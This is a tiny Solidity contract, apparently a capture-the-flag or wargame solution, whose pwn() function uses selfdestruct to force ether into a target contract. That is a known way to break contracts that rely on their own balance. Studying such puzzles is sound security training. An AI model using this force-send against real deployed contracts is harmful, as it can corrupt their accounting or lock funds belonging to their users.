// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

contract SevenEthExploit {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external payable {
        // write your code here
        selfdestruct(payable(target));
    }
}